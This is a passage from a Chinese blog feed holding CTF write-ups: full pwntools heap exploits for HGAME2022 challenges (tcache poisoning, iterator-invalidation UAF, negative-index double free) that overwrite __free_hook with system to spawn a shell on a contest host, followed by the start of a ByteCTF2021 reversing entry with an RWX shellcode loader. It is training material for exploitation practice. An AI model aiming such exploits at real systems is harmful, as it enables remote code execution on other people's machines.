class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):         </span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>,<span class="string">&quot;protect&quot;</span>)<span class="comment">#防止合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)       <span class="comment">#unsorted bin       chunk0</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x100</span>*<span class="number">2</span>))<span class="comment">#chunk overlapping    chunk1</span></span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#chunk2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#清空tcache</span></span><br><span class="line">    add(i, <span class="number">0xf8</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0xf8</span>,<span class="string">&quot;a&quot;</span>)       <span class="comment">#chunk0</span></span><br><span class="line">show(<span class="number">8</span>)<span class="comment">#chunk1</span></span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache poisoning</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#chunk1</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(free_hook))<span class="comment">#uaf</span></span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xf8</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xf8</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="week4">week4</h2><h3 id="vector">vector</h3><h4 id="思路-6">思路</h4><p>​    libc 版本 2.31</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215200343706.png" class=""><p>​    <code>move_note</code> 函数中存在 <code>vector</code> 迭代器失效的漏洞，<code>vector</code> 的 <code>resize</code> 操作会改变容器容量，进行扩容时会重新分配内存，那么指向容器的迭代器、指针和引用都会失效，而下面移动的操作会使用已经失效的迭代器，存在 UAF</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215222352049.png" class=""><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215200657646.png" class=""><p>​    通过调试可以发现在 <code>move_note</code> 扩容后可以把失效迭代器中的值复制到要 <code>move</code> 到的地方，这样就可以实现 <code>double free</code>，为了绕过 key 检测还是使用 <code>tcache stashing</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tcache stashing</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">12</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x70</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x70</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">14</span>)</span><br></pre></td></tr></table></figure><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215203411422.png" class=""><p>​     为了 leak libc 基址要先 <code>malloc</code> 一个较大的堆块，然后 <code>free</code> 进入 <code>unsorted bin</code> 。这时再申请一个较小的堆块，那么 <code>unsorted bin</code> 就会被切割，切割出来的块内有指向 <code>main_arena</code> 内部的指针，就可以得到 libc 基址</p><p>​    <a href="https://10-0-0-55.github.io/pwn/unsorted-bin/#leak-heap-libc">https://10-0-0-55.github.io/pwn/unsorted-bin/#leak-heap-libc</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):         </span><br><span class="line">    add(i, <span class="number">0xf0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)                   <span class="comment">#得到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)      <span class="comment">#切割 unsorted bin</span></span><br><span class="line">show(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><h4 id="exp-6">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./vector&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">53088</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./vector&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):         </span><br><span class="line">    add(i, <span class="number">0xf0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)                   <span class="comment">#得到 unsorted bin</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x50</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)      <span class="comment">#切割 unsorted bin</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">8</span>)</span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">336</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">14</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">move(<span class="number">20</span>)                    <span class="comment">#UAF</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">13</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache stashing</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="number">12</span>):</span><br><span class="line">    add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x70</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x70</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="Final">Final</h2><h3 id="pwn1">pwn1</h3><h4 id="思路-7">思路</h4><ul><li><code>add</code> 里面没有限制申请堆块的大小，<code>delete</code> 和 <code>view</code> 里面 <code>index</code> 可以是负的</li></ul><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220313002633643.png" class=""><ul><li>可以先利用 <code>unsorted bin</code> 泄露 <code>libc</code> 和 <code>heap</code> 基址</li><li><code>note</code> 通过 <code>mmap</code> 分配，如果申请一个较大的堆块，根据内存排布可以知道新分配的较大的堆块会在 <code>note</code> 的附近</li></ul><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220313003153680.png" class=""><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220313003925677.png" class=""><ul><li>这样就可以在申请较大堆块的时候写入堆地址，和负数下标的漏洞一起可以导致 <code>double free</code></li><li>libc 版本为 2.31，之后的利用就是 <code>tcache stashing</code> 那一套</li></ul><h4 id="exp-7">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;pwn1&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">20000</span>)</span><br><span class="line">f = ELF(<span class="string">&quot;./pwn1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    r.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>):</span><br><span class="line">    create(<span class="number">0x80</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x80</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">view(<span class="number">7</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: aaaaaaaa&quot;</span>)</span><br><span class="line">heapbase = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7a0</span></span><br><span class="line">log.success(<span class="string">&quot;heap base: &quot;</span>+<span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">view(<span class="number">9</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;content: aaaaaaaa&quot;</span>)</span><br><span class="line">lbase = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ebc60</span></span><br><span class="line">free_hook = lbase + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;to be fastbin&#x27;</span>)        <span class="comment">#fastbin double free  11</span></span><br><span class="line">create(<span class="number">0x21000</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20ff0</span>+p64(heapbase+<span class="number">0x6e0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    create(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">20</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">delete(-<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):        <span class="comment">#tcache 先于 fasbin 被分配</span></span><br><span class="line">    create(<span class="number">0x30</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>,p64(free_hook))</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(r)[0])</span></span><br><span class="line">create(<span class="number">0x30</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">20</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;pwn学习&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021决赛re writeup</title>
    <link href="https://www.0wl.site/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/"/>
    <id>https://www.0wl.site/2021/12/13/ByteCTF2021%E5%86%B3%E8%B5%9Bre-writeup/</id>
    <published>2021-12-13T15:21:37.000Z</published>
    <updated>2021-12-13T15:11:19.451Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>ByteCTF 中部分逆向题的wp</p></div></article><span id="more"></span><h2 id="BabyHeaven">BabyHeaven</h2><p>​这下面是队友做的部分和写的 wp ⬇</p><p>​使用以下代码加载所给文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> mem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x4000</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;BabyHeaven&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="built_in">fread</span>(mem, <span class="number">1</span>, <span class="number">0x3476</span>, fp);</span><br><span class="line">((<span class="built_in"><span class="keyword">void</span></span> (*)())mem)();</span><br></pre></td></tr></table></figure><p>​调试可得程序使用VirtualAlloc函数分配了一段可执行的空间，并写入了自己的汇编代码来执行，直接将其中的二进制数字用正则表达式筛选出来，需要注意的是其中顺序有颠倒，写成二进制文件，构造函数，即可得到如下算法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 